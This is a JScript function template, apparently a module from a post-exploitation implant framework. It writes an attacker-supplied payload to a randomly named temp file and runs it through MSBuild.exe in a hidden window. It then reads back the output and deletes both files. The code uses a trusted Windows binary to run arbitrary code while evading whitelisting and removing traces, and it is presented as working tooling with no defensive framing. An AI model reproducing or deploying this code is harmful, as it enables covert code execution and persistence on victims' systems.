function msbuild(stub, stdout_filename) {
  msbuild_path = {{ variables['tmp'][1] }} + '\\{{ random_string }}.txt';
  if ({{ variables['file-system-object'][0] }}.FileExists(msbuild_path)) {
    return msbuild_path + ' already exists.';
  }
  var stream = new ActiveXObject("ADODB.Stream");
  stream.Open();
  stream.Type = 1;
  stream.Write(stub);
  stream.Position = 0;
  stream.SaveToFile(msbuild_path, 2);
  stream.Close();
  command = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Msbuild.exe ' + msbuild_path;
  stdout_path = {{ variables['tmp'][1] }} + '\\' + stdout_filename + '.txt';
  try {
    {{ variables['wscript.shell'][0] }}.Run(command, 0, true);
    results = 'Executed ( ' + command + ' )\n\n';
    results = results + download(stdout_path, 'string');
    delfile(stdout_path);
    delfile(msbuild_path);
    return results;
  } catch (e) {
    return 'Failed to run ' + command + ': ' + e.message;
  }
}
